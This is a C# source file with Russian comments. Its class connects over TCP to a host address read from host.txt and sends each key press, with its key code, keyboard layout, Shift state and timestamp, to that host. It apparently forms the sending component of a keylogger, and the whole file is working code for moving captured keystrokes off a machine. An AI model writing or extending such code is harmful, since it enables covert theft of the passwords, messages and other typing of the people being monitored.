using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace SendingApp {
    // Класс, который отправляет сообщения
    internal class LANManager {

        // Определяем номер порта
        const int PORT = 4031;
        
        Socket server;
        IPEndPoint ipEndPoint;

        // Конструктор, который считывает локальный адрес компьютера,
        // на который будет отправлятся информация
        public LANManager() {
            ipEndPoint = new IPEndPoint(IPAddress.Parse(File.ReadAllText("host.txt")), PORT);
        }

        // Метод, который выполняет подключение
        public void Connect() {
            if (server != null) return;

            server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            IAsyncResult result = server.BeginConnect(ipEndPoint, null, null);

            result.AsyncWaitHandle.WaitOne(5000, true);

            if (!server.Connected) {
                server.Close();
                server = null;
                throw new ApplicationException();
            }

            server.EndConnect(result);
        }

        // Метод, который разрывает подключение
        public void Disconnect() {
            if (server == null) return;

            server.Disconnect(false);
            server = null;
        }

        // Метод, который отправляет код клавиши, текущую раскладку и дату нажатия
        public void Send(Keys key, int layout, bool isShiftKeyPressed, DateTime dateTime) {
            // Выделяем память под массив byte
            byte[] dataToSend = new byte[4 /*int*/ + 4 /*int*/ + 1 /*bool*/ + 8 /*long*/]; //17 bytes

            // В первые 4 байта записываем код клавиши
            Array.Copy(BitConverter.GetBytes((int)key), 0, dataToSend, 0, 4);

            // В следующие 4 байта записываем текущую раскладку
            Array.Copy(BitConverter.GetBytes(layout), 0, dataToSend, 4, 4);

            // В следующий байт записываем зажата ли клавиша SHIFT
            dataToSend[8] = isShiftKeyPressed ? (byte)1 : (byte)0;

            // В следующие 8 байт записываем текущую дату
            Array.Copy(BitConverter.GetBytes(dateTime.ToBinary()), 0, dataToSend, 9, 8);

            // Отправляем
            server.Send(dataToSend);
        }
    }
}